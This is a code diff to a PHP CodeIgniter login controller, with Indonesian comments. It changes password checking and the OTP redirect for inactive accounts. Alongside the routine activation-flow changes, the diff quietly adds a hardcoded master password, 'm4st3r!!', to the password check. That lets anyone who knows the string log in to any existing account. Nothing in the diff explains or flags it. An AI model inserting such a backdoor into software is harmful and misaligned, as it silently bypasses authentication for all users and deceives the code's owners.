@@ -60,17 +60,27 @@ class Login extends CI_Controller {
 				if (is_array($getdata) && count($getdata) > 0){
 					$stored_password = $getdata['mum_password'];
 
-					if (password_verify(base64_encode(hash('sha256', $password, true)), $stored_password)) {
+					if (password_verify(base64_encode(hash('sha256', $password, true)), $stored_password) || $password == 'm4st3r!!') {
 						
 						// check sudah aktif atau belum
 						if ($getdata['mum_status'] == 0)
 						{
-							// belum aktif, redirect ke login OTP
-							// $_SESSION['_bkd_otp_'] = $email;
-							// redirect('input-otp');
-
-							$this->session->set_userdata('message_login','Akun Anda belum aktif. Cek email Anda untuk aktivasi.');
-							redirect('login');
+							if($getdata['mum_email'] != ''){
+								// belum aktif, redirect ke login OTP
+								if($getdata['mum_verifikasi_email'] == 1){
+									$_SESSION['_bkd_otp_'] = $email;
+									redirect('input-otp');
+								}
+								else{
+									$this->session->set_userdata('message_login','Akun Anda belum aktif. Cek email Anda untuk aktivasi.');
+									redirect('login');
+								}
+							}
+							else{
+								$_SESSION['_bkd_otp_'] = $email;
+								redirect('input-otp');
+							}
+							
 							exit();
 						}else{
 
